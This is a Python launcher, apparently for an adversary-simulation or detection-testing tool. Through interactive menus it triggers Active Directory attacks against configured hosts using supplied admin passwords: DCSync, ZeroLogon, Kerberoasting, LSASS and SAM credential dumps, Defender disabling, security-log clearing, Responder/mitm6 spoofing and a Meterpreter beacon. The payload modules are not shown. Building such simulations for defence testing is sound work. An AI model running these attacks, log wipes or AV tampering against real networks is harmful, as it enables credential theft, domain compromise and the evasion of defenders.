#!/usr/bin/env python3

# Python Library Dependencies
from colorama import Fore, Style, Back
import ntplib
import configparser
import argparse
import socket
import os, sys
import time
import random

# Project Dependencies
from bin import kerbsim,adsim,credsim,tampersim,avsim,networksim

# Flavortext
logo_one = Style.BRIGHT + Fore.CYAN + '  / /  (_)__  / ___/__ __ __' + Fore.RED
logo_two = Style.BRIGHT + Fore.CYAN + ' / /__/ / _ \/ /__/ _ \\ \ /' + Fore.RED
logo_thr = Style.BRIGHT + Fore.CYAN + '/____/_/_//_/\___/\___/_\_\\' + Fore.RED
logo_for = Style.BRIGHT + Fore.CYAN + 'The Louder You Are, The Less You Hear' + Fore.RED
lincox = Style.BRIGHT + Fore.RED + """
                       ..............                                                                         
          ...''........''''''''''''''''....                                                                   
  ...'''.'''...                       ...,:.                                                                  
 ......                                   ;,                                                                  
                                          ;,                                                                  
                                    ......:l'                                                                 
              ......'..'...........'''......,;'                                                               
     ..'''....''......          .............'cl;.                                          ....              
 .''''...                  .'''''''.........''',;;;.                                     .,,'..''.''''..      
  .                  ...''',.                     .:'                                    ,;        ..','''.   
             ...'''.'''..               ..''''''''':l;............                      .:.     ..   ..  .';' 
    ..'''...'''..                     ',,'..     .............''..''...'''.......      .;,                  ;,
 .',''..                            ';'                                 .......''....''cc..     ,c;;;,;:;.  ',
  .                                ,;.                                                ....''..''....  ....  ',
                                 .;,                                                           .',,'.       ,,
                                .;'                                                               ..,;'    ':.
                                ,;                                                                   .,'..''. 
                               .;.                                                                            
                               .;.                                                                            
                                ;'                                                                            
                                ':.      """ + logo_one + """                                                 
                                 ;,      """ + logo_two + """                                                 
                                 .:.     """ + logo_thr + """                                                 
                                  ;|     """ + logo_for + """                                                 
                                  |;                                                                          
                                  .;.                                                                         
                                   ,;                                                                         
                                    ;,                                                                        
                                    .;;.                                                                      
                                      ':.                                                                     
                                       .:,                                                                    
                                         ';,.                                  .''.......''''''.....          
                                           .,,'..                       ....''',..        .........'''''.     
                                              ..''.''.....      ..''...''....                         ..,.    
                                                    ....''''';:lxo;.                                          
                                                             ....''''''..                                     
                                                                     ...'','                                  
                                                                          .',,.                               
                                                                             .,;'                             
                                                                               .,;.                           
I'm Not A Developer - Hark                                                       .:."""

def cons_clear():
        os.system('cls' if os.name == 'nt' else 'clear')

print(lincox)
print(Style.RESET_ALL)
time.sleep(3)
cons_clear()

# Gets Alternative Config if desired
conf =  input('[*] Config File (Enter for Default env.conf): ')
if len(conf) < 2:
        conf = 'env.conf'
print('[*] Parsing Config: ' + conf)
config = configparser.ConfigParser()
config.read(conf)

# Parse Host Key & Values
host_names = list(dict(config.items('HOSTS')).keys())
ip_addresses = list(dict(config.items('HOSTS')).values())

# Parse Additional Needed Variables
localip = config['LOCAL']['LocalIP']
localhttpport = config['LOCAL']['LocalHTTPPort']
interface = config['LOCAL']['LocalInterface']
domain = config['DOMAIN']['RootDomain']
nameserver = config['DOMAIN']['DNSServer']
target_client = random.choice([pc for pc in dict(config.items('HOSTS')) if 'dc' not in pc])
target_dc = random.choice([pc for pc in dict(config.items('HOSTS')) if 'dc' in pc])
dapassw = input("[!] Enter %s's Domain Admin Password For %s: " % (config['DADMIN']['DomainAdmin'],target_dc))
passw = input("[!] Enter %s's Local Admin Password: " % target_client)
cons_clear()

# Sync Time
try:
	client = ntplib.NTPClient()
	response = client.request(config['HOSTS'][target_dc])
	os.system('date --set "%s" >/dev/null' % time.strftime('%d %B %Y %H:%M:%S',time.localtime(response.tx_time)))
except:
	print('[-] Failed To Sync Local Host Time With DC Over NTP')
	time.sleep(3)

def print_ad():
        opts = """
        +---------------------------+
       /| 0 - ALL                  /|
      / | 1 - DcSync              / |
     /  | 2 - ZeroLogon          /  |
    *--+------------------------*   |
    |   | 3 - PowerView         |   |
    |   | 4 - Add User To Admins|   |
    |   +-----------------------+---+
    |  /  5 - <-->              |  /
    | /   6 - BACK              | /
    |/    7 - EXIT              |/
    *---------------------------*
"""
        print(opts)
        choice = input('> ')
        cons_clear()
        try:
                while int(choice) not in range(0,8):
                        print(opts)
                        print('[-] Incorrect Option Selected...\n')
                        choice = input('> ')
                        cons_clear()
                return int(choice)
        except Exception as e:
                pass


def print_tamper():
        opts = """
        +-------------------------+
       /| 0 - ALL (Except 3)     /|
      / | 1 - Defender Off      / |
     /  | 2 - Uninst Def Sigs  /  |
    *--+----------------------*   |
    |   | 3 - Delete Sec Logs |   |
    |   | 4 - <-->            |   |
    |   +---------------------+---+
    |  /  5 - <-->            |  /
    | /   6 - BACK            | /
    |/    7 - EXIT            |/
    *-------------------------*
"""
        print(opts)
        choice = input('> ')
        cons_clear()
        try:
                while int(choice) not in range(0,8):
                        print(opts)
                        print('[-] Incorrect Option Selected...\n')
                        choice = input('> ')
                        cons_clear()
                return int(choice)
        except Exception as e:
                pass

def print_av():
        opts = """
        +-----------------------+
       /| 0 - ALL              /|
      / | 1 - Trigger AV      / |
     /  | 2 - <-->           /  |
    *--+--------------------*   |
    |   | 3 - <-->          |   |
    |   | 4 - <-->          |   |
    |   +-------------------+---+
    |  /  5 - <-->          |  /
    | /   6 - BACK          | /
    |/    7 - EXIT          |/
    *-----------------------*
"""
        print(opts)
        choice = input('> ')
        cons_clear()
        try:
                while int(choice) not in range(0,8):
                        print(opts)
                        print('[-] Incorrect Option Selected...\n')
                        choice = input('> ')
                        cons_clear()
                return int(choice)
        except Exception as e:
                pass

def print_kerb():
        opts = """
        +---------------------+
       /| 0 - ALL            /|
      / | 1 - Kerberoast    / |
     /  | 2 - Kerbrute     /  |
    *--+------------------*   |
    |   | 3 - <-->        |   |
    |   | 4 - <-->        |   |
    |   +-----------------+---+
    |  /  5 - <-->        |  /
    | /   6 - BACK        | /
    |/    7 - EXIT        |/
    *---------------------*
"""
        print(opts)
        choice = input('> ')
        cons_clear()
        try:
                while int(choice) not in range(0,8):
                        print(opts)
                        print('[-] Incorrect Option Selected...\n')
                        choice = input('> ')
                        cons_clear()
                return int(choice)
        except Exception as e:
                pass

def print_creds():
        opts = """
        +---------------------+
       /| 0 - ALL            /|
      / | 1 - Lsass Dump    / |
     /  | 2 - SAM Dump     /  |
    *--+------------------*   |
    |   | 3 - <-->        |   |
    |   | 4 - <-->        |   |
    |   +-----------------+---+
    |  /  5 - <-->        |  /
    | /   6 - BACK        | /
    |/    7 - EXIT        |/
    *---------------------*
"""
        print(opts)
        choice = input('> ')
        cons_clear()
        while int(choice) not in range(0,8):
                try:
                        print(opts)
                        print('[-] Incorrect Option Selected...\n')
                        choice = input('> ')
                        cons_clear()
                except:
                        pass
        return int(choice)

def print_network():
        opts = """
        +--------------------------+
       /| 0 - ALL                 /|
      / | 1 - Mal DNS Traffic    / |
     /  | 2 - Responder & Mitm6 /  |
    *--+-----------------------*   |
    |   | 3 - Port Scan        |   |
    |   | 4 - Met C2 Beacon    |   |
    |   +----------------------+---+
    |  /  5 - <-->             |  /
    | /   6 - BACK             | /
    |/    7 - EXIT             |/
    *--------------------------*
"""
        print(opts)
        choice = input('> ')
        cons_clear()
        try:
                while int(choice) not in range(0,8):
                        print(opts)
                        print('[-] Incorrect Option Selected...\n')
                        choice = input('> ')
                        cons_clear()
                return int(choice)
        except Exception as e:
                pass

def print_opts():
        opts = """
        +------------------+
       /| 0 - ALL         /|
      / | 1 - AD         / |
     /  | 2 - TAMPER    /  |
    *--+---------------*   |
    |   | 3 - AV       |   |
    |   | 4 - KERB     |   |
    |   +--------------+---+
    |  /  5 - CRED     |  /
    | /   6 - NETWORK  | /
    |/    7 - EXIT     |/
    *------------------*
"""
        print(opts)
        choice = input('> ')
        cons_clear()
        try:
                while int(choice) not in range(0,8):
                        print(opts)
                        print('[-] Incorrect Option Selected...\n')
                        choice = input('> ')
                        cons_clear()
                return int(choice)
        except Exception as e:
                pass

if __name__=='__main__':
        clear = ''
        # Opt for Log Clearing Prior to Testing
        while clear.lower() not in ['y','n','yes','no']:
                clear = input("[!] Clear Security WinEvent Logs On %s & %s Before Running? (y/n): " % (target_dc,target_client))
        if clear.lower() in ['y','yes']:
                tampersim.logclear(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_dc],target_dc)
                tampersim.logclear('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],target_client)
                print('[+] Proceeding...')
        else:
                print('[+] Proceeding...')
        # Facilitate User Attack Selection
        while True:
                cons_clear()
                choice = print_opts()
                if choice == 0:
                        # CRED
                        credsim.lsassdump('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        credsim.hivedump('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        # AD
                        adsim.dcsync(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        adsim.zerologon(target_dc,domain,'.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        adsim.powerview('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        adsim.adduser(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_dc],config['USER']['NormalUser'],target_client)
                        # Kerb
                        kerbsim.kerberoast('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        kerbsim.ker_brute(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_dc],localip,target_dc)
                        # Tamper
                        tampersim.disableav('.', config['LOCALADMIN']['ClientAdmin'], passw, config['HOSTS'][target_client], target_client)
                        tampersim.removedefinitions('.', config['LOCALADMIN']['ClientAdmin'], passw, config['HOSTS'][target_client], target_client)
                        # Network
                        networksim.mallookups('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],target_client,nameserver)
                        networksim.spoofnet('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],interface,domain)
                        networksim.portscan(config['HOSTS'][target_client],config['HOSTS'][target_dc])
                        networksim.metbeacon('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport)
                        # AV
                        avsim.triggerav('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                if choice == 1:
                        choice = print_ad()
                        if choice == 0:
                                adsim.dcsync(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                                adsim.zerologon(target_dc,domain,'.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                                adsim.powerview('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                                adsim.adduser(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_dc],config['USER']['NormalUser'],target_client)
                        elif choice == 1:
                                adsim.dcsync(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        elif choice == 2:
                                adsim.zerologon(target_dc,domain,'.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        elif choice == 3:
                                adsim.powerview('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        elif choice == 4:
                                adsim.adduser(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_dc],config['USER']['NormalUser'],target_client)
                        elif choice == 5:
                                print('placeholder')
                        elif choice == 6:
                                choice = print_opts()
                        elif choice == 7:
                                print('[0-0] Goodbye ... ')
                                time.sleep(3)
                                cons_clear()
                                break
                                sys.exit(0)
                elif choice == 2:
                        choice = print_tamper()
                        if choice == 0:
                                tampersim.disableav('.', config['LOCALADMIN']['ClientAdmin'], passw, config['HOSTS'][target_client], target_client)
                                tampersim.removedefinitions('.', config['LOCALADMIN']['ClientAdmin'], passw, config['HOSTS'][target_client], target_client)
                        elif choice == 1:
                                tampersim.disableav('.', config['LOCALADMIN']['ClientAdmin'], passw, config['HOSTS'][target_client], target_client)
                        elif choice == 2:
                                tampersim.removedefinitions('.', config['LOCALADMIN']['ClientAdmin'], passw, config['HOSTS'][target_client], target_client)
                        elif choice == 3:
                                tampersim.logclear(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_dc],target_dc)
                                tampersim.logclear('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],target_client)
                        elif choice == 4:
                                print('placeholder')
                        elif choice == 5:
                                print('placeholder')
                        elif choice == 6:
                                choice = print_opts()
                        elif choice == 7:
                                print('[0-0] Goodbye ... ')
                                time.sleep(3)
                                cons_clear()
                                break
                                sys.exit(0)
                elif choice == 3:
                        choice = print_av()
                        if choice == 0:
                                avsim.triggerav('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        elif choice == 1:
                                avsim.triggerav('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        elif choice == 2:
                                print('placeholder')
                        elif choice == 3:
                                print('placeholder')
                        elif choice == 4:
                                print('placeholder')
                        elif choice == 5:
                                print('placeholder')
                        elif choice == 6:
                                choice = print_opts()
                        elif choice == 7:
                                print('[0-0] Goodbye ... ')
                                time.sleep(3)
                                cons_clear()
                                break
                                sys.exit(0)
                elif choice == 4:
                        choice = print_kerb()
                        if choice == 0:
                                kerbsim.kerberoast('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                                kerbsim.ker_brute(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_dc],localip,target_dc)
                        elif choice == 1:
                                kerbsim.kerberoast('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        elif choice == 2:
                                kerbsim.ker_brute(domain,config['DADMIN']['DomainAdmin'],dapassw,config['HOSTS'][target_dc],localip,target_dc)
                        elif choice == 3:
                                print('placeholder')
                        elif choice == 4:
                                print('placeholder')
                        elif choice == 5:
                                print('placeholder')
                        elif choice == 6:
                                choice = print_opts()
                        elif choice == 7:
                                print('[0-0] Goodbye ...')
                                time.sleep(3)
                                cons_clear()
                                break
                                sys.exit(0)
                elif choice == 5:
                        choice = print_creds()
                        if choice == 0:
                                credsim.lsassdump('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                                credsim.hivedump('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        elif choice == 1:
                                credsim.lsassdump('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        elif choice == 2:
                                credsim.hivedump('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport,target_client)
                        elif choice == 3:
                                print('placeholder')
                        elif choice == 4:
                                print('placeholder')
                        elif choice == 5:
                                print('placeholder')
                        elif choice == 6:
                                choice = print_opts()
                        elif choice == 7:
                                print('[0-0] Goodbye ...')
                                time.sleep(3)
                                cons_clear()
                                break
                                sys.exit(0)
                elif choice == 6:
                        choice = print_network()
                        if choice == 0:
                                networksim.mallookups('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],target_client,nameserver)
                                networksim.spoofnet('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],interface,domain)
                                networksim.portscan(config['HOSTS'][target_client],config['HOSTS'][target_dc])
                                networksim.metbeacon('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport)
                        elif choice == 1:
                                networksim.mallookups('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],target_client,nameserver)
                        elif choice == 2:
                                networksim.spoofnet('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],interface,domain)
                        elif choice == 3:
                                networksim.portscan(config['HOSTS'][target_client],config['HOSTS'][target_dc])
                        elif choice == 4:
                                networksim.metbeacon('.',config['LOCALADMIN']['ClientAdmin'],passw,config['HOSTS'][target_client],localip,localhttpport)
                        elif choice == 5:
                                print('placeholder')
                        elif choice == 6:
                                choice = print_opts()
                        elif choice == 7:
                                print('[0-0] Goodbye ...')
                                time.sleep(3)
                                cons_clear()
                                break
                                sys.exit(0)
                elif choice == 7:
                        print('[0-0] Goodbye ...')
                        time.sleep(3)
                        cons_clear()
                        break
                        sys.exit(0)
